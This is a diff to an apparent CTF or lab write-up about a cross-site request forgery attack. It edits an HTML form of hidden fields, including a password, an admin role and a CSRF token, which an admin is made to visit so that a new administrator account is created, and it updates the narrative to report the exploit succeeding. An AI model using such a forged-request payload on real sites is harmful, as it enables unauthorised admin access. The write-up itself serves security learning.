@@ -142,7 +142,7 @@ and yes there is, and it verifies if the csrf token is valid, which in this case
     <input type="hidden" name="password" value="Admin123!">
     <input type="hidden" name="full_name" value="New Admin">
     <input type="hidden" name="email" value="admin@admin.com">
-    <input type="hidden" name="new_admin" value="2007-02-26">
+    <input type="hidden" name="dob" value="2007-02-26">
     <input type="hidden" name="address" value="street">
     <input type="hidden" name="user_role" value="admin">
     <input type="hidden" name="csrf_token" value="d3b6e35fa0d8240655230c9ec8869dca">
@@ -160,7 +160,9 @@ so now we serve this html page and make the admin visit it: we save this page to
 and we got a request:\
 ![alt text](image-28.png)\
 the admin visited it, so now we hope he created this new user with admin priveleges, let's try to login with it: ``` bl0rph:Admin123! ``` \
-it's not logging in, we might have made a mistake idk, now we have to do the whole process from zero cuz the lecturer cookie is invalid now, ffs\
+done, we are admin!\
+![alt text](image-29.png)\
+let's look for stuff:\
 
 
 
